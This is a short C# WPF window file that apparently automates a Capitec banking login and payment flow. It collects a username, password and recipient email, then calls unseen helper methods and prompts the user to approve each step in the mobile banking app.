using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Shapes;

namespace easyeftthc
{
    /// <summary>
    /// Interaction logic for CapitecAuth.xaml
    /// </summary>
    public partial class CapitecAuth : Window
    {
        public static string rec;
        public CapitecAuth()
        {
            InitializeComponent();
        }

        private void Button_Click(object sender, RoutedEventArgs e)
        {
            string user = username.Text;
            string pass = password.Password;
            rec = recemail.Text;

            Capitec.CapitecLog(user, pass);

            MessageBox.Show("Please check mobile banking app");

            Capitec.conCap(rec);

            MessageBox.Show("Please check mobile banking app");

            Capitec.conPay1();

            MessageBox.Show("Please check mobile banking app");

            Capitec.conPay2();
        }
    }
}
